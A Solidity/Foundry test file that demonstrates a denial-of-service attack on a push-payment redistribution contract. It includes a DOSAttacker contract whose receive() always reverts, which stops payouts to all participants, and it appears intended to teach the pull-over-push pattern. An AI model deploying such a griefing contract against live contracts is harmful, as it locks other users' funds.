// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {PullOverPush} from "../src/Redistribution.sol";

contract PullOverPushTest is Test {
    PullOverPush public pop;
    DOSAttacker public att;

    address a1 = makeAddr("alice");
    address a2 = makeAddr("bob");
    address a3 = makeAddr("charlie");
    address a4 = makeAddr("david");

    function setUp() public {
        pop = new PullOverPush();

        // Create 4 other accounts and for each of them call pop.participate()
        vm.prank(a1);
        pop.participate();

        vm.prank(a2);
        pop.participate();

        vm.prank(a3);
        pop.participate();

        vm.prank(a4);
        pop.participate();

        // Fund pop with 1 ether
        vm.deal(address(this), 1 ether);
        (bool success,) = address(pop).call{value: 1 ether}("");
        require(success, "Funding failed");
    }

    function test_dos() public {
        att = new DOSAttacker(payable(address(pop)));
        att.joinContest();

        vm.prank(address(0xBEEF));
        pop.retrieveAllPush();

        // invariant: pot should be zero after distribution
        assertEq(pop.pot(), 0);
    }
}

/**
 * @notice This contract is used to exploit the Push pattern of the above contract.
 *         Calling joinContest() is enough to lock down the push pattern
 */
contract DOSAttacker {
    PullOverPush target;

    constructor(address payable _target) {
        target = PullOverPush(_target);
    }

    receive() external payable {
        revert("Next time you should use Pull over Push!");
    }

    function joinContest() external {
        target.participate();
    }
}
